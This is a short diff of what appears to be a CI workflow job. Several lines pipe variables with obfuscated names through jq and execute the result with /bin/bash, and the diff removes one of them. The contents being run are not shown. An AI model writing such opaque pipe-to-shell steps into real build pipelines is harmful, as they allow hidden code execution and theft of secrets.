@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$wh7" | jq -r .lgyvm6610 | /bin/bash
           echo $zx15208 | jq -r .uo4635 | /bin/bash
           echo $oc93 | jq -r .qnn3 | /bin/bash
-          printf '%s' "$fe2052" | jq -r .s5 | /bin/bash
           echo $efl430 | jq -r .g0 | /bin/bash
 
       - name: Archive results
